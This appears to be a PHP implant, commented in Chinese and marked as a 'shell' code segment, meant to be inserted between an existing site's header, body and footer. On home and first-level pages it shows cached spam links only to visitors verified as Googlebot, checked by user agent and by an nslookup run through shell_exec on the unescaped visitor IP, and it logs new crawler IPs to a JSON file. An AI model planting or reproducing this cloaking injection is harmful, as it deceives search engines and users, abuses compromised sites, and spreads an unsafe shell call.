
原网页头部内容<br>
<hr>
原网页 主体<br>
<hr>



<?php
//### shell 代码段　开始　###
/*** 缓存路径 ***/
$filePath = './data/cache.json';

/*** 判断页面位置层级 否是网站首页或一级目录 ***/
function isHomePageOrFirstLevelPage() {    
    $currentURL = $_SERVER['REQUEST_URI'];
    $parsedURL = parse_url($currentURL);
    $path = $parsedURL['path'];  
    $path = trim($path, '/');  // 移除路径中的开头和结尾的斜杠
    $pathSegments = explode('/', $path);    // 将路径按照斜杠分割为数组
    // 如果路径为空或者只有一个元素，则表示是首页或一级目录页面
    if (empty($pathSegments) || count($pathSegments) <= 1) {
        return true;
    } else {
        return false;
    }
}

//判断 userAgent 'Googlebot'
function isGooglebot() {    
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    // echo "isGooglebot processing";
    // echo $userAgent;
    if (strpos($userAgent, 'Googlebot') ) {
        return true;
    } else {
        return false;
    }     
}
//判断 dns host 'googlebot.com'
function isGoogleHost($ip){    
    $hostname ="0";
    $command='nslookup'.$ip;
    $hostname = shell_exec($command);//linux可能行,win测试没反应
    if (strpos($hostname, 'googlebot.com') !== false) {
        return true;
    }else{
        return false;
    }
    
}
//更新 新ip到本地
function updateIP($ip,$jsonData,$filePath){
    //$jsonData 是 json_decod 后的
    $jsonData['GooglebotIPs'][] = $ip;
    $jsonData['newGooglebotIPs'][] = $ip;     
    // echo $jsonData;
    file_put_contents($filePath, json_encode($jsonData,320));//禁中文禁/
    
}
//显示links数据
function showLinks($links){
    // echo "showLinks processing <br>";
    $linksHtml = '';
    foreach ($links as $link) {
        $anchorText = $link['anchortext'];
        $url = $link['url'];
        $linkHtml = ' <a href="' . $url . '">' . $anchorText . '</a> ';
        $linksHtml .= $linkHtml;
    }
    echo $linksHtml;
}

 

/*** 如果数据文件不存在:过,什么也不做；　如果存在：1.判断　更新　新ggIP，覆写文件，2.读取数据　显示在当前页面位置； *** */
// 　A.判断页级范围 B.判断ip范围 C.判断是否Googlebot  （ ###增加新ip 到本地JSON文件中）//　###显示links数据　html
if (file_exists($filePath)) 
{
    //A.判断页级范围
    if (isHomePageOrFirstLevelPage()) { 
        // echo "isHomePageOrFirstLevelPage = YES<br>";
        $cacheData = file_get_contents($filePath);    
        $data = json_decode($cacheData, true); 
        // $GooglebotIPs=[];
        $GooglebotIPs = $data['GooglebotIPs'];  // 读取缓存中的GooglebotIPs  *
        $ip = $_SERVER['REMOTE_ADDR']; //当前ip
        // echo $ip;
        // var_dump( $GooglebotIPs);     　

        //B.判断ip范围 
        if (in_array($ip, $GooglebotIPs)) {
            // echo "in_array ip,googleIPs = YES<br>";
            $links = $data['linksAndAnchorTexts']; //取本地JSON文件中　links数据
            showLinks($links);
        }else{
            // echo "NOT in_array ip,googleIPs <br>";
            //不在ip表中，需要　C.判断是否Googlebot
             //if ( isGooglebot()  ) {//测试用一个条件　***************************************
                // echo "isGooglebot = YES<br>";
            if ( isGooglebot() && isGoogleHost($ip) ) {//真正使用2个条件
                $links = $data['linksAndAnchorTexts'];
                showLinks($links);
                //更新ip 到JSON-> 本地$filePath
                updateIP($ip,$data,$filePath);               
            }

        }//endif B.判断ip范围 
   
    }//endif A.判断页级范围 //else do nothing 
    

   
}
//else do nothing
//### shell 代码段　结束　###
?>


<hr>原网页footer
<br> ORIGENAL XXX 111 <br>
<br>ORIGENAL 中文　222 <br>


